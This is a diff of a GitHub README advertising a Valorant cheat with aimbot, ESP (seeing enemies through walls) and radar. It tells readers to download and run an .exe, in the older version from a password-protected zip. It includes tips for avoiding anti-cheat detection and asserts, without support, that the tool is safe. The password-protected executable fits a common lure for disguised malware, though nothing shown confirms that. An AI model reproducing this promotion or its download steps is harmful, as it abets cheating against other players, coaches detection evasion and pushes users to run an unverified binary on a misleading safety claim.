@@ -1,64 +1,73 @@
-<div align="center">
-    <h1 style="font-size:2.5em;color:#FF4500;">🔥 STUGWARE CHEAT FOR VALORANT 🔥</h1>
-    <h2 style="color:#4682B4;">Essential Tools for Legit and Semi-Rage Gameplay</h2>
-</div>
+# 🎮 VALORANT-STUGWARE-CHEAT - A Smart Tool for Easy Gameplay
 
----
+[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-blue.svg)](https://github.com/SMDFaisal/VALORANT-STUGWARE-CHEAT/releases)
 
-<div align="center">
-    <h2 style="color:#32CD32;">📸 Screenshots</h2>
-    <img src="https://github.com/user-attachments/assets/f32d1553-0ba0-4951-8c4c-3220408eda5c" alt="Stugware Screenshot 1" width="80%" style="border:2px solid #FF4500;border-radius:10px;box-shadow:5px 5px 15px rgba(0,0,0,0.5);margin-bottom:20px;">
-    <img src="https://github.com/user-attachments/assets/b643a616-6337-47c7-961b-22e0a8cb818f" alt="Stugware Screenshot 2" width="80%" style="border:2px solid #4682B4;border-radius:10px;box-shadow:5px 5px 15px rgba(0,0,0,0.5);margin-bottom:20px;">
-</div>
+## 🚀 Getting Started
 
----
+Welcome to VALORANT-STUGWARE-CHEAT! This tool enhances your gameplay in Valorant with features like Aimbot, ESP, and Radar. Follow these steps to download and run the application easily.
 
-## 🌟 **Overview**
-**Stugware Cheat for Valorant** is a basic yet highly effective cheat that includes essential features such as **Aimbot**, **ESP**, and **Radar**. While the Aimbot comes with limited settings, you can create a subtle, undetectable aiming setup or a stronger configuration resembling **Semi-Rage gameplay**. The **ESP** system is where Stugware shines, offering detailed visuals including **boxes, skeletons, icons**, and the ability to display **spike location** and **abilities**. With its sleek and intuitive menu, enabling or disabling features is effortless. For players who value stealth, the included **Radar** makes Stugware a perfect choice.
+## 📥 Download & Install
 
----
+1. **Visit the Releases Page**
+   Go to our [Releases page](https://github.com/SMDFaisal/VALORANT-STUGWARE-CHEAT/releases) to find the latest version of VALORANT-STUGWARE-CHEAT.
 
-## 🚀 **How to Use**
-<div style="background-color:#F5F5F5;padding:20px;border-radius:10px;">
-    <ol>
-        <li>
-            <b style="color:#FF4500;">Download:</b>  
-            <a href="https://github.com/Ntheatle/VALORANT-STUGWARE-CHEAT/releases/download/latest/StugwareValorant.zip" style="text-decoration:none;color:#4682B4;">🔹 Get the latest version from Github 🔹</a>
-        </li>
-        <li>
-            <b style="color:#32CD32;">Unzip Archive:</b>  
-            💼 Password: `StugwareValorant`
-        </li>
-        <li>
-            <b style="color:#FF4500;">Run Application:</b>  
-            Execute the `.exe` file after unzipping.
-        </li>
-        <li>
-            <b style="color:#4682B4;">Activate:</b>  
-            Press <b>HOME</b> to launch and configure the cheat.
-        </li>
-    </ol>
-</div>
+2. **Choose the Right Version**
+   On the Releases page, scroll down to see the available versions. Click on the latest release to see the files.
 
----
+3. **Download the Application**
+   Look for a file that ends in `.exe`. Click the file to start your download. This file is your main application.
 
-<div align="center">
-    <h2 style="color:#32CD32;">💡 FEATURES</h2>
-</div>
-<img src="https://github.com/user-attachments/assets/0a180728-0cc4-4497-83e7-67eed1dcd6a6" alt="Stugware Screenshot 1" width="80%" style="border:2px solid #FF4500;border-radius:10px;box-shadow:5px 5px 15px rgba(0,0,0,0.5);margin-bottom:20px;">
+4. **Run the Application**
+   Once the file downloads, locate it in your downloads folder. Double-click on the file to run the application.
 
----
+5. **Follow Any Setup Instructions**
+   If prompted, follow the on-screen instructions to complete the setup. This may involve agreeing to terms or choosing a location for installation.
 
-## 📄 **License**
-<div style="background-color:#F5F5F5;padding:20px;border-radius:10px;">
-    This project is licensed under the **MIT License**. See the LICENSE file for details.
-</div>
+## 📋 System Requirements
 
----
+- **Operating System:** Windows 10 or later
+- **RAM:** Minimum 4 GB
+- **Processor:** Dual-core or better
+- **Graphics Card:** DirectX 11 compatible
+- **Internet Connection:** Required for the features to work properly
 
-<div align="center">
-    <h2 style="color:#4682B4;">📬 CONTACT</h2>
-    <p>Need help? Reach out to us:</p>
-    <a href="" style="text-decoration:none;color:#FF4500;">GitHub</a>  
-    Email: <b style="color:#32CD32;">support@stugware.com</b>
-</div>
+## 🛠 Features
+
+- **Aimbot:** Improve your aim. The Aimbot can be adjusted for subtle or aggressive gameplay.
+- **ESP:** See enemy locations through walls and obstacles to gain an advantage.
+- **Radar:** Keep track of opponents on a simplified radar layout.
+
+## 💡 Usage Tips
+
+- **Start with Default Settings:** If you're new to cheats, start with the default Aimbot settings. Adjust as you get more comfortable.
+- **Play Cautiously:** Use subtle settings to avoid detection and ensure a better gaming experience.
+- **Stay Updated:** Keep checking our Releases page for updates which may include new features or improvements.
+
+## ❓ Frequently Asked Questions
+
+### 1. Is this tool safe to use?
+Yes, VALORANT-STUGWARE-CHEAT is designed to enhance your gameplay while minimizing detection. However, always use cheats responsibly.
+
+### 2. Can I run this tool on my laptop?
+If your laptop meets the system requirements mentioned above, you can run VALORANT-STUGWARE-CHEAT without issues.
+
+### 3. What if I encounter problems?
+If you face any issues, check the information on our GitHub page. You can also reach out to the community for support.
+
+## 🌐 Community and Support
+
+Join our community for help and tips. Share your experiences and learn from others. Visit [GitHub Discussions](https://github.com/SMDFaisal/VALORANT-STUGWARE-CHEAT/discussions) for more information and assistance.
+
+## 🔗 Additional Resources
+
+For further usage tips and feature discussions, visit our Wiki section on GitHub. It's a good place to learn more about advanced settings and strategies.
+
+## 📑 Contributing
+
+We welcome contributions. If you have ideas or improvements, feel free to submit a pull request. Your input can help us enhance VALORANT-STUGWARE-CHEAT.
+
+## 🔒 License
+
+VALORANT-STUGWARE-CHEAT is licensed under the MIT License. You can use, modify, and distribute the software under the terms of this license.
+
+Enjoy your gaming with VALORANT-STUGWARE-CHEAT!
